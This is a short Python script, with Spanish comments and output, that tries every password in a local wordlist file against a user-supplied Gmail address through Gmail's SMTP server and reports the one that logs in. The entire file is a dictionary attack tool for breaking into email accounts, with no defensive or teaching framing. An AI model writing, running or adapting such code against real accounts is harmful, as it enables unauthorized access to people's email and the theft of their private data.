import smtplib 
#host-server y puerto variables

smtserver = smtplib.SMTP("smtp.gmail.com", 587)
smtserver.ehlo()
smtserver.starttls()

print("\n")

email = input("Email: ")

dic = open("./combinaciones2.txt", "r")

for pwd in dic:
    try:
        smtserver.login(email, pwd)
        print("Contraseña correcta: %s" % pwd)
        break;
    except smtplib.SMTPAuthenticationError:
        print("Contraseña Incorrecta: %s" % pwd)

